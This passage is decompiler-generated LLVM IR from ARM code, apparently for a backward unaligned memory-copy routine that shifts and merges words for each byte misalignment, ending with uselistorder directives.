  %v1_209e0 = urem i32 %v0_209e0, 4
  store i32 %v1_209e0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_209e0 = icmp eq i32 %v1_209e0, 0
  store i1 %v2_209e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_209e0, label %dec_label_pc_20924, label %dec_label_pc_209e8

dec_label_pc_209e8:                               ; preds = %dec_label_pc_2091c, %dec_label_pc_209e0
  %v0_20a3019 = phi i32 [ %v2_20908, %dec_label_pc_2091c ], [ %v0_20a3020, %dec_label_pc_209e0 ]
  %v0_20adc = phi i32 [ %v2_2090c, %dec_label_pc_2091c ], [ %v2_209d8, %dec_label_pc_209e0 ]
  %v0_209e8 = phi i32 [ %v2_20904, %dec_label_pc_2091c ], [ %v0_209e0, %dec_label_pc_209e0 ]
  %v0_209f0 = phi i32 [ %v1_2091c, %dec_label_pc_2091c ], [ %v1_209e0, %dec_label_pc_209e0 ]
  %v1_209e8 = and i32 %v0_209e8, -4
  store i32 %v1_209e8, i32* %r1.global-to-local, align 4
  %v1_209ec = inttoptr i32 %v1_209e8 to i32*
  %v2_209ec = load i32, i32* %v1_209ec, align 4
  store i32 %v2_209ec, i32* %r3.global-to-local, align 4
  %v7_209f0 = icmp ult i32 %v0_209f0, 2
  %v2_20ad4 = add i32 %v0_20adc, -12
  %v4_20ad4 = sub i32 11, %v0_20adc
  %v5_20ad4 = and i32 %v4_20ad4, %v0_20adc
  %v6_20ad4 = icmp slt i32 %v5_20ad4, 0
  store i1 %v6_20ad4, i1* %cpsr_v.global-to-local, align 1
  %v7_20ad4 = icmp slt i32 %v2_20ad4, 0
  store i1 %v7_20ad4, i1* %cpsr_n.global-to-local, align 1
  %v8_20ad4 = icmp eq i32 %v0_20adc, 12
  store i1 %v8_20ad4, i1* %cpsr_z.global-to-local, align 1
  %v5_20ad8 = icmp slt i32 %v0_20adc, 12
  br i1 %v7_209f0, label %dec_label_pc_20ad4, label %dec_label_pc_209f8

dec_label_pc_209f8:                               ; preds = %dec_label_pc_209e8
  %v8_209f0 = icmp eq i32 %v0_209f0, 2
  br i1 %v8_209f0, label %dec_label_pc_20a68, label %dec_label_pc_209fc

dec_label_pc_209fc:                               ; preds = %dec_label_pc_209f8
  br i1 %v5_20ad8, label %dec_label_pc_20a48, label %dec_label_pc_20a04

dec_label_pc_20a04:                               ; preds = %dec_label_pc_209fc
  store i32 %v2_20ad4, i32* %r2.global-to-local, align 4
  %v3_20a08 = load i32, i32* @r4, align 4
  store i32 %v3_20a08, i32* %stack_var_-12, align 4
  %v6_20a08 = load i32, i32* @r5, align 4
  %v8_20a08 = inttoptr i32 %v6_20a08 to i8*
  store i8* %v8_20a08, i8** %stack_var_-8, align 4
  %v11_20a08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_20a0c

dec_label_pc_20a0c:                               ; preds = %dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge, %dec_label_pc_20a04
  %v0_20a30 = phi i32 [ %v1_20a30, %dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge ], [ %v0_20a3019, %dec_label_pc_20a04 ]
  %v0_20a10 = phi i32 [ %v0_20a10.pre, %dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge ], [ %v1_209e8, %dec_label_pc_20a04 ]
  %v0_20a0c = phi i32 [ %v0_20a0c.pre, %dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge ], [ %v2_209ec, %dec_label_pc_20a04 ]
  %v3_20a0c = mul i32 %v0_20a0c, 256
  store i32 %v3_20a0c, i32* %lr.global-to-local, align 4
  %v1_20a10 = add i32 %v0_20a10, -4
  %v2_20a10 = inttoptr i32 %v1_20a10 to i32*
  %v3_20a10 = load i32, i32* %v2_20a10, align 4
  store i32 %v3_20a10, i32* %r3.global-to-local, align 4
  %v4_20a10 = add i32 %v0_20a10, -8
  %v5_20a10 = inttoptr i32 %v4_20a10 to i32*
  %v6_20a10 = load i32, i32* %v5_20a10, align 4
  store i32 %v6_20a10, i32* %r4.global-to-local, align 4
  %v7_20a10 = add i32 %v0_20a10, -12
  %v8_20a10 = inttoptr i32 %v7_20a10 to i32*
  %v9_20a10 = load i32, i32* %v8_20a10, align 4
  store i32 %v9_20a10, i32* %r5.global-to-local, align 4
  %v10_20a10 = add i32 %v0_20a10, -16
  %v11_20a10 = inttoptr i32 %v10_20a10 to i32*
  %v12_20a10 = load i32, i32* %v11_20a10, align 4
  store i32 %v10_20a10, i32* %r1.global-to-local, align 4
  %v4_20a14 = udiv i32 %v12_20a10, 16777216
  %v5_20a14 = or i32 %v4_20a14, %v3_20a0c
  store i32 %v5_20a14, i32* %lr.global-to-local, align 4
  %v3_20a18 = mul i32 %v12_20a10, 256
  %v4_20a1c = udiv i32 %v9_20a10, 16777216
  %v5_20a1c = or i32 %v3_20a18, %v4_20a1c
  store i32 %v5_20a1c, i32* @ip, align 4
  %v3_20a20 = mul i32 %v9_20a10, 256
  %v4_20a24 = udiv i32 %v6_20a10, 16777216
  %v5_20a24 = or i32 %v3_20a20, %v4_20a24
  store i32 %v5_20a24, i32* %r5.global-to-local, align 4
  %v3_20a28 = mul i32 %v6_20a10, 256
  %v4_20a2c = udiv i32 %v3_20a10, 16777216
  %v5_20a2c = or i32 %v3_20a28, %v4_20a2c
  store i32 %v5_20a2c, i32* %r4.global-to-local, align 4
  %v1_20a30 = add i32 %v0_20a30, -16
  %v2_20a30 = inttoptr i32 %v1_20a30 to i32*
  store i32 %v5_20a2c, i32* %v2_20a30, align 4
  %v4_20a30 = add i32 %v0_20a30, -12
  %v5_20a30 = inttoptr i32 %v4_20a30 to i32*
  %v6_20a30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_20a30, i32* %v5_20a30, align 4
  %v7_20a30 = add i32 %v0_20a30, -8
  %v8_20a30 = inttoptr i32 %v7_20a30 to i32*
  %v9_20a30 = load i32, i32* @ip, align 4
  store i32 %v9_20a30, i32* %v8_20a30, align 4
  %v10_20a30 = add i32 %v0_20a30, -4
  %v11_20a30 = inttoptr i32 %v10_20a30 to i32*
  %v12_20a30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_20a30, i32* %v11_20a30, align 4
  store i32 %v1_20a30, i32* %r0.global-to-local, align 4
  %v0_20a34 = load i32, i32* %r2.global-to-local, align 4
  %v2_20a34 = add i32 %v0_20a34, -16
  store i32 %v2_20a34, i32* %r2.global-to-local, align 4
  %v6_20a38 = icmp slt i32 %v0_20a34, 16
  br i1 %v6_20a38, label %dec_label_pc_20a3c, label %dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge

dec_label_pc_20a0c.dec_label_pc_20a0c_crit_edge:  ; preds = %dec_label_pc_20a0c
  %v0_20a0c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_20a10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a0c

dec_label_pc_20a3c:                               ; preds = %dec_label_pc_20a0c
  %v2_20a3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_20a3c, i32* @r4, align 4
  %v5_20a3c = load i8*, i8** %stack_var_-8, align 4
  %v6_20a3c = ptrtoint i8* %v5_20a3c to i32
  store i32 %v6_20a3c, i32* @r5, align 4
  store i32 %v11_20a08, i32* @lr, align 4
  %v2_20a40 = add i32 %v0_20a34, -4
  store i32 %v2_20a40, i32* %r2.global-to-local, align 4
  %v4_20a40 = add i32 %v0_20a34, 2147483632
  %v5_20a40 = and i32 %v2_20a40, %v4_20a40
  %v6_20a40 = icmp slt i32 %v5_20a40, 0
  store i1 %v6_20a40, i1* %cpsr_v.global-to-local, align 1
  %v7_20a40 = icmp slt i32 %v2_20a40, 0
  store i1 %v7_20a40, i1* %cpsr_n.global-to-local, align 1
  %v8_20a40 = icmp eq i32 %v2_20a40, 0
  store i1 %v8_20a40, i1* %cpsr_z.global-to-local, align 1
  %v5_20a44 = icmp slt i32 %v2_20a34, -12
  br i1 %v5_20a44, label %dec_label_pc_20a60, label %dec_label_pc_20a48

dec_label_pc_20a48:                               ; preds = %dec_label_pc_20a3c, %dec_label_pc_209fc, %dec_label_pc_20a48
  %v1_20a54 = phi i32 [ %v5_20a54, %dec_label_pc_20a48 ], [ %v1_20a30, %dec_label_pc_20a3c ], [ %v0_20a3019, %dec_label_pc_209fc ]
  %v0_20a48 = load i32, i32* %r3.global-to-local, align 4
  %v3_20a48 = mul i32 %v0_20a48, 256
  store i32 %v3_20a48, i32* %ip.global-to-local, align 4
  %v0_20a4c = load i32, i32* %r1.global-to-local, align 4
  %v1_20a4c = add i32 %v0_20a4c, -4
  %v2_20a4c = inttoptr i32 %v1_20a4c to i32*
  %v3_20a4c = load i32, i32* %v2_20a4c, align 4
  store i32 %v3_20a4c, i32* %r3.global-to-local, align 4
  store i32 %v1_20a4c, i32* %r1.global-to-local, align 4
  %v4_20a50 = udiv i32 %v3_20a4c, 16777216
  %v5_20a50 = or i32 %v4_20a50, %v3_20a48
  store i32 %v5_20a50, i32* @ip, align 4
  %v2_20a54 = add i32 %v1_20a54, -4
  %v3_20a54 = inttoptr i32 %v2_20a54 to i32*
  store i32 %v5_20a50, i32* %v3_20a54, align 4
  %v4_20a54 = load i32, i32* %r0.global-to-local, align 4
  %v5_20a54 = add i32 %v4_20a54, -4
  store i32 %v5_20a54, i32* %r0.global-to-local, align 4
  %v0_20a58 = load i32, i32* %r2.global-to-local, align 4
  %v2_20a58 = add i32 %v0_20a58, -4
  store i32 %v2_20a58, i32* %r2.global-to-local, align 4
  %v6_20a5c = icmp slt i32 %v0_20a58, 4
  br i1 %v6_20a5c, label %dec_label_pc_20a60.loopexit, label %dec_label_pc_20a48

dec_label_pc_20a60.loopexit:                      ; preds = %dec_label_pc_20a48
  %v4_20a58 = sub i32 3, %v0_20a58
  %v5_20a58 = and i32 %v4_20a58, %v0_20a58
  %v6_20a58 = icmp slt i32 %v5_20a58, 0
  %v7_20a58 = icmp slt i32 %v2_20a58, 0
  store i1 %v6_20a58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_20a58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20a60

dec_label_pc_20a60:                               ; preds = %dec_label_pc_20a60.loopexit, %dec_label_pc_20a3c
  %v2_209a451 = phi i32 [ %v5_20a54, %dec_label_pc_20a60.loopexit ], [ %v1_20a30, %dec_label_pc_20a3c ]
  %v0_2099447 = phi i32 [ %v2_20a58, %dec_label_pc_20a60.loopexit ], [ %v2_20a40, %dec_label_pc_20a3c ]
  %v0_20a60 = load i32, i32* %r1.global-to-local, align 4
  %v1_20a60 = add i32 %v0_20a60, 3
  store i32 %v1_20a60, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_20a68:                               ; preds = %dec_label_pc_209f8
  br i1 %v5_20ad8, label %dec_label_pc_20ab4, label %dec_label_pc_20a70

dec_label_pc_20a70:                               ; preds = %dec_label_pc_20a68
  store i32 %v2_20ad4, i32* %r2.global-to-local, align 4
  %v3_20a74 = load i32, i32* @r4, align 4
  store i32 %v3_20a74, i32* %stack_var_-12, align 4
  %v6_20a74 = load i32, i32* @r5, align 4
  %v8_20a74 = inttoptr i32 %v6_20a74 to i8*
  store i8* %v8_20a74, i8** %stack_var_-8, align 4
  %v11_20a74 = load i32, i32* @lr, align 4
  br label %dec_label_pc_20a78

dec_label_pc_20a78:                               ; preds = %dec_label_pc_20a78.dec_label_pc_20a78_crit_edge, %dec_label_pc_20a70
  %v0_20a9c = phi i32 [ %v1_20a9c, %dec_label_pc_20a78.dec_label_pc_20a78_crit_edge ], [ %v0_20a3019, %dec_label_pc_20a70 ]
  %v0_20a7c = phi i32 [ %v0_20a7c.pre, %dec_label_pc_20a78.dec_label_pc_20a78_crit_edge ], [ %v1_209e8, %dec_label_pc_20a70 ]
  %v0_20a78 = phi i32 [ %v0_20a78.pre, %dec_label_pc_20a78.dec_label_pc_20a78_crit_edge ], [ %v2_209ec, %dec_label_pc_20a70 ]
  %v3_20a78 = mul i32 %v0_20a78, 65536
  store i32 %v3_20a78, i32* %lr.global-to-local, align 4
  %v1_20a7c = add i32 %v0_20a7c, -4
  %v2_20a7c = inttoptr i32 %v1_20a7c to i32*
  %v3_20a7c = load i32, i32* %v2_20a7c, align 4
  store i32 %v3_20a7c, i32* %r3.global-to-local, align 4
  %v4_20a7c = add i32 %v0_20a7c, -8
  %v5_20a7c = inttoptr i32 %v4_20a7c to i32*
  %v6_20a7c = load i32, i32* %v5_20a7c, align 4
  store i32 %v6_20a7c, i32* %r4.global-to-local, align 4
  %v7_20a7c = add i32 %v0_20a7c, -12
  %v8_20a7c = inttoptr i32 %v7_20a7c to i32*
  %v9_20a7c = load i32, i32* %v8_20a7c, align 4
  store i32 %v9_20a7c, i32* %r5.global-to-local, align 4
  %v10_20a7c = add i32 %v0_20a7c, -16
  %v11_20a7c = inttoptr i32 %v10_20a7c to i32*
  %v12_20a7c = load i32, i32* %v11_20a7c, align 4
  store i32 %v10_20a7c, i32* %r1.global-to-local, align 4
  %v4_20a80 = udiv i32 %v12_20a7c, 65536
  %v5_20a80 = or i32 %v4_20a80, %v3_20a78
  store i32 %v5_20a80, i32* %lr.global-to-local, align 4
  %v3_20a84 = mul i32 %v12_20a7c, 65536
  %v4_20a88 = udiv i32 %v9_20a7c, 65536
  %v5_20a88 = or i32 %v3_20a84, %v4_20a88
  store i32 %v5_20a88, i32* @ip, align 4
  %v3_20a8c = mul i32 %v9_20a7c, 65536
  %v4_20a90 = udiv i32 %v6_20a7c, 65536
  %v5_20a90 = or i32 %v3_20a8c, %v4_20a90
  store i32 %v5_20a90, i32* %r5.global-to-local, align 4
  %v3_20a94 = mul i32 %v6_20a7c, 65536
  %v4_20a98 = udiv i32 %v3_20a7c, 65536
  %v5_20a98 = or i32 %v3_20a94, %v4_20a98
  store i32 %v5_20a98, i32* %r4.global-to-local, align 4
  %v1_20a9c = add i32 %v0_20a9c, -16
  %v2_20a9c = inttoptr i32 %v1_20a9c to i32*
  store i32 %v5_20a98, i32* %v2_20a9c, align 4
  %v4_20a9c = add i32 %v0_20a9c, -12
  %v5_20a9c = inttoptr i32 %v4_20a9c to i32*
  %v6_20a9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_20a9c, i32* %v5_20a9c, align 4
  %v7_20a9c = add i32 %v0_20a9c, -8
  %v8_20a9c = inttoptr i32 %v7_20a9c to i32*
  %v9_20a9c = load i32, i32* @ip, align 4
  store i32 %v9_20a9c, i32* %v8_20a9c, align 4
  %v10_20a9c = add i32 %v0_20a9c, -4
  %v11_20a9c = inttoptr i32 %v10_20a9c to i32*
  %v12_20a9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_20a9c, i32* %v11_20a9c, align 4
  store i32 %v1_20a9c, i32* %r0.global-to-local, align 4
  %v0_20aa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_20aa0 = add i32 %v0_20aa0, -16
  store i32 %v2_20aa0, i32* %r2.global-to-local, align 4
  %v6_20aa4 = icmp slt i32 %v0_20aa0, 16
  br i1 %v6_20aa4, label %dec_label_pc_20aa8, label %dec_label_pc_20a78.dec_label_pc_20a78_crit_edge

dec_label_pc_20a78.dec_label_pc_20a78_crit_edge:  ; preds = %dec_label_pc_20a78
  %v0_20a78.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_20a7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a78

dec_label_pc_20aa8:                               ; preds = %dec_label_pc_20a78
  %v2_20aa8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_20aa8, i32* @r4, align 4
  %v5_20aa8 = load i8*, i8** %stack_var_-8, align 4
  %v6_20aa8 = ptrtoint i8* %v5_20aa8 to i32
  store i32 %v6_20aa8, i32* @r5, align 4
  store i32 %v11_20a74, i32* @lr, align 4
  %v2_20aac = add i32 %v0_20aa0, -4
  store i32 %v2_20aac, i32* %r2.global-to-local, align 4
  %v4_20aac = add i32 %v0_20aa0, 2147483632
  %v5_20aac = and i32 %v2_20aac, %v4_20aac
  %v6_20aac = icmp slt i32 %v5_20aac, 0
  store i1 %v6_20aac, i1* %cpsr_v.global-to-local, align 1
  %v7_20aac = icmp slt i32 %v2_20aac, 0
  store i1 %v7_20aac, i1* %cpsr_n.global-to-local, align 1
  %v8_20aac = icmp eq i32 %v2_20aac, 0
  store i1 %v8_20aac, i1* %cpsr_z.global-to-local, align 1
  %v5_20ab0 = icmp slt i32 %v2_20aa0, -12
  br i1 %v5_20ab0, label %dec_label_pc_20acc, label %dec_label_pc_20ab4

dec_label_pc_20ab4:                               ; preds = %dec_label_pc_20aa8, %dec_label_pc_20a68, %dec_label_pc_20ab4
  %v1_20ac0 = phi i32 [ %v5_20ac0, %dec_label_pc_20ab4 ], [ %v1_20a9c, %dec_label_pc_20aa8 ], [ %v0_20a3019, %dec_label_pc_20a68 ]
  %v0_20ab4 = load i32, i32* %r3.global-to-local, align 4
  %v3_20ab4 = mul i32 %v0_20ab4, 65536
  store i32 %v3_20ab4, i32* %ip.global-to-local, align 4
  %v0_20ab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_20ab8 = add i32 %v0_20ab8, -4
  %v2_20ab8 = inttoptr i32 %v1_20ab8 to i32*
  %v3_20ab8 = load i32, i32* %v2_20ab8, align 4
  store i32 %v3_20ab8, i32* %r3.global-to-local, align 4
  store i32 %v1_20ab8, i32* %r1.global-to-local, align 4
  %v4_20abc = udiv i32 %v3_20ab8, 65536
  %v5_20abc = or i32 %v4_20abc, %v3_20ab4
  store i32 %v5_20abc, i32* @ip, align 4
  %v2_20ac0 = add i32 %v1_20ac0, -4
  %v3_20ac0 = inttoptr i32 %v2_20ac0 to i32*
  store i32 %v5_20abc, i32* %v3_20ac0, align 4
  %v4_20ac0 = load i32, i32* %r0.global-to-local, align 4
  %v5_20ac0 = add i32 %v4_20ac0, -4
  store i32 %v5_20ac0, i32* %r0.global-to-local, align 4
  %v0_20ac4 = load i32, i32* %r2.global-to-local, align 4
  %v2_20ac4 = add i32 %v0_20ac4, -4
  store i32 %v2_20ac4, i32* %r2.global-to-local, align 4
  %v6_20ac8 = icmp slt i32 %v0_20ac4, 4
  br i1 %v6_20ac8, label %dec_label_pc_20acc.loopexit, label %dec_label_pc_20ab4

dec_label_pc_20acc.loopexit:                      ; preds = %dec_label_pc_20ab4
  %v4_20ac4 = sub i32 3, %v0_20ac4
  %v5_20ac4 = and i32 %v4_20ac4, %v0_20ac4
  %v6_20ac4 = icmp slt i32 %v5_20ac4, 0
  %v7_20ac4 = icmp slt i32 %v2_20ac4, 0
  store i1 %v6_20ac4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_20ac4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20acc

dec_label_pc_20acc:                               ; preds = %dec_label_pc_20acc.loopexit, %dec_label_pc_20aa8
  %v2_209a452 = phi i32 [ %v5_20ac0, %dec_label_pc_20acc.loopexit ], [ %v1_20a9c, %dec_label_pc_20aa8 ]
  %v0_2099448 = phi i32 [ %v2_20ac4, %dec_label_pc_20acc.loopexit ], [ %v2_20aac, %dec_label_pc_20aa8 ]
  %v0_20acc = load i32, i32* %r1.global-to-local, align 4
  %v1_20acc = add i32 %v0_20acc, 2
  store i32 %v1_20acc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_20ad4:                               ; preds = %dec_label_pc_209e8
  br i1 %v5_20ad8, label %dec_label_pc_20b20, label %dec_label_pc_20adc

dec_label_pc_20adc:                               ; preds = %dec_label_pc_20ad4
  store i32 %v2_20ad4, i32* %r2.global-to-local, align 4
  %v3_20ae0 = load i32, i32* @r4, align 4
  store i32 %v3_20ae0, i32* %stack_var_-12, align 4
  %v6_20ae0 = load i32, i32* @r5, align 4
  %v8_20ae0 = inttoptr i32 %v6_20ae0 to i8*
  store i8* %v8_20ae0, i8** %stack_var_-8, align 4
  %v11_20ae0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_20ae4

dec_label_pc_20ae4:                               ; preds = %dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge, %dec_label_pc_20adc
  %v0_20b08 = phi i32 [ %v1_20b08, %dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge ], [ %v0_20a3019, %dec_label_pc_20adc ]
  %v0_20ae8 = phi i32 [ %v0_20ae8.pre, %dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge ], [ %v1_209e8, %dec_label_pc_20adc ]
  %v0_20ae4 = phi i32 [ %v0_20ae4.pre, %dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge ], [ %v2_209ec, %dec_label_pc_20adc ]
  %v3_20ae4 = mul i32 %v0_20ae4, 16777216
  store i32 %v3_20ae4, i32* %lr.global-to-local, align 4
  %v1_20ae8 = add i32 %v0_20ae8, -4
  %v2_20ae8 = inttoptr i32 %v1_20ae8 to i32*
  %v3_20ae8 = load i32, i32* %v2_20ae8, align 4
  store i32 %v3_20ae8, i32* %r3.global-to-local, align 4
  %v4_20ae8 = add i32 %v0_20ae8, -8
  %v5_20ae8 = inttoptr i32 %v4_20ae8 to i32*
  %v6_20ae8 = load i32, i32* %v5_20ae8, align 4
  store i32 %v6_20ae8, i32* %r4.global-to-local, align 4
  %v7_20ae8 = add i32 %v0_20ae8, -12
  %v8_20ae8 = inttoptr i32 %v7_20ae8 to i32*
  %v9_20ae8 = load i32, i32* %v8_20ae8, align 4
  store i32 %v9_20ae8, i32* %r5.global-to-local, align 4
  %v10_20ae8 = add i32 %v0_20ae8, -16
  %v11_20ae8 = inttoptr i32 %v10_20ae8 to i32*
  %v12_20ae8 = load i32, i32* %v11_20ae8, align 4
  store i32 %v10_20ae8, i32* %r1.global-to-local, align 4
  %v4_20aec = udiv i32 %v12_20ae8, 256
  %v5_20aec = or i32 %v4_20aec, %v3_20ae4
  store i32 %v5_20aec, i32* %lr.global-to-local, align 4
  %v3_20af0 = mul i32 %v12_20ae8, 16777216
  %v4_20af4 = udiv i32 %v9_20ae8, 256
  %v5_20af4 = or i32 %v3_20af0, %v4_20af4
  store i32 %v5_20af4, i32* @ip, align 4
  %v3_20af8 = mul i32 %v9_20ae8, 16777216
  %v4_20afc = udiv i32 %v6_20ae8, 256
  %v5_20afc = or i32 %v3_20af8, %v4_20afc
  store i32 %v5_20afc, i32* %r5.global-to-local, align 4
  %v3_20b00 = mul i32 %v6_20ae8, 16777216
  %v4_20b04 = udiv i32 %v3_20ae8, 256
  %v5_20b04 = or i32 %v3_20b00, %v4_20b04
  store i32 %v5_20b04, i32* %r4.global-to-local, align 4
  %v1_20b08 = add i32 %v0_20b08, -16
  %v2_20b08 = inttoptr i32 %v1_20b08 to i32*
  store i32 %v5_20b04, i32* %v2_20b08, align 4
  %v4_20b08 = add i32 %v0_20b08, -12
  %v5_20b08 = inttoptr i32 %v4_20b08 to i32*
  %v6_20b08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_20b08, i32* %v5_20b08, align 4
  %v7_20b08 = add i32 %v0_20b08, -8
  %v8_20b08 = inttoptr i32 %v7_20b08 to i32*
  %v9_20b08 = load i32, i32* @ip, align 4
  store i32 %v9_20b08, i32* %v8_20b08, align 4
  %v10_20b08 = add i32 %v0_20b08, -4
  %v11_20b08 = inttoptr i32 %v10_20b08 to i32*
  %v12_20b08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_20b08, i32* %v11_20b08, align 4
  store i32 %v1_20b08, i32* %r0.global-to-local, align 4
  %v0_20b0c = load i32, i32* %r2.global-to-local, align 4
  %v2_20b0c = add i32 %v0_20b0c, -16
  store i32 %v2_20b0c, i32* %r2.global-to-local, align 4
  %v6_20b10 = icmp slt i32 %v0_20b0c, 16
  br i1 %v6_20b10, label %dec_label_pc_20b14, label %dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge

dec_label_pc_20ae4.dec_label_pc_20ae4_crit_edge:  ; preds = %dec_label_pc_20ae4
  %v0_20ae4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_20ae8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20ae4

dec_label_pc_20b14:                               ; preds = %dec_label_pc_20ae4
  %v2_20b14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_20b14, i32* @r4, align 4
  %v5_20b14 = load i8*, i8** %stack_var_-8, align 4
  %v6_20b14 = ptrtoint i8* %v5_20b14 to i32
  store i32 %v6_20b14, i32* @r5, align 4
  store i32 %v11_20ae0, i32* @lr, align 4
  %v2_20b18 = add i32 %v0_20b0c, -4
  store i32 %v2_20b18, i32* %r2.global-to-local, align 4
  %v4_20b18 = add i32 %v0_20b0c, 2147483632
  %v5_20b18 = and i32 %v2_20b18, %v4_20b18
  %v6_20b18 = icmp slt i32 %v5_20b18, 0
  store i1 %v6_20b18, i1* %cpsr_v.global-to-local, align 1
  %v7_20b18 = icmp slt i32 %v2_20b18, 0
  store i1 %v7_20b18, i1* %cpsr_n.global-to-local, align 1
  %v8_20b18 = icmp eq i32 %v2_20b18, 0
  store i1 %v8_20b18, i1* %cpsr_z.global-to-local, align 1
  %v5_20b1c = icmp slt i32 %v2_20b0c, -12
  br i1 %v5_20b1c, label %dec_label_pc_20b38, label %dec_label_pc_20b20

dec_label_pc_20b20:                               ; preds = %dec_label_pc_20b14, %dec_label_pc_20ad4, %dec_label_pc_20b20
  %v1_20b2c = phi i32 [ %v5_20b2c, %dec_label_pc_20b20 ], [ %v1_20b08, %dec_label_pc_20b14 ], [ %v0_20a3019, %dec_label_pc_20ad4 ]
  %v0_20b20 = load i32, i32* %r3.global-to-local, align 4
  %v3_20b20 = mul i32 %v0_20b20, 16777216
  store i32 %v3_20b20, i32* %ip.global-to-local, align 4
  %v0_20b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_20b24 = add i32 %v0_20b24, -4
  %v2_20b24 = inttoptr i32 %v1_20b24 to i32*
  %v3_20b24 = load i32, i32* %v2_20b24, align 4
  store i32 %v3_20b24, i32* %r3.global-to-local, align 4
  store i32 %v1_20b24, i32* %r1.global-to-local, align 4
  %v4_20b28 = udiv i32 %v3_20b24, 256
  %v5_20b28 = or i32 %v4_20b28, %v3_20b20
  store i32 %v5_20b28, i32* @ip, align 4
  %v2_20b2c = add i32 %v1_20b2c, -4
  %v3_20b2c = inttoptr i32 %v2_20b2c to i32*
  store i32 %v5_20b28, i32* %v3_20b2c, align 4
  %v4_20b2c = load i32, i32* %r0.global-to-local, align 4
  %v5_20b2c = add i32 %v4_20b2c, -4
  store i32 %v5_20b2c, i32* %r0.global-to-local, align 4
  %v0_20b30 = load i32, i32* %r2.global-to-local, align 4
  %v2_20b30 = add i32 %v0_20b30, -4
  store i32 %v2_20b30, i32* %r2.global-to-local, align 4
  %v6_20b34 = icmp slt i32 %v0_20b30, 4
  br i1 %v6_20b34, label %dec_label_pc_20b38.loopexit, label %dec_label_pc_20b20

dec_label_pc_20b38.loopexit:                      ; preds = %dec_label_pc_20b20
  %v4_20b30 = sub i32 3, %v0_20b30
  %v5_20b30 = and i32 %v4_20b30, %v0_20b30
  %v6_20b30 = icmp slt i32 %v5_20b30, 0
  %v7_20b30 = icmp slt i32 %v2_20b30, 0
  store i1 %v6_20b30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_20b30, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20b38

dec_label_pc_20b38:                               ; preds = %dec_label_pc_20b38.loopexit, %dec_label_pc_20b14
  %v2_209a453 = phi i32 [ %v5_20b2c, %dec_label_pc_20b38.loopexit ], [ %v1_20b08, %dec_label_pc_20b14 ]
  %v0_2099449 = phi i32 [ %v2_20b30, %dec_label_pc_20b38.loopexit ], [ %v2_20b18, %dec_label_pc_20b14 ]
  %v0_20b38 = load i32, i32* %r1.global-to-local, align 4
  %v1_20b38 = add i32 %v0_20b38, 1
  store i32 %v1_20b38, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_20b2c, { 0, 2, 1 }
  uselistorder i32 %v3_20b20, { 1, 0 }
  uselistorder i32 %v2_20b18, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_20b08, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_20ae8, { 1, 0 }
  uselistorder i32 %v3_20ae4, { 1, 0 }
  uselistorder i32 %v0_20ae8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_20b08, { 3, 2, 1, 0 }
  uselistorder i32 %v5_20ac0, { 0, 2, 1 }
  uselistorder i32 %v3_20ab4, { 1, 0 }
  uselistorder i32 %v2_20aac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_20a9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_20a7c, { 1, 0 }
  uselistorder i32 %v3_20a78, { 1, 0 }
  uselistorder i32 %v0_20a7c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_20a9c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_20a54, { 0, 2, 1 }
  uselistorder i32 %v3_20a48, { 1, 0 }
  uselistorder i32 %v2_20a40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_20a30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_20a10, { 1, 0 }
  uselistorder i32 %v3_20a0c, { 1, 0 }
  uselistorder i32 %v0_20a10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_20a30, { 3, 2, 1, 0 }
  uselistorder i1 %v5_20ad8, { 2, 0, 1 }
  uselistorder i32 %v0_209f0, { 1, 0 }
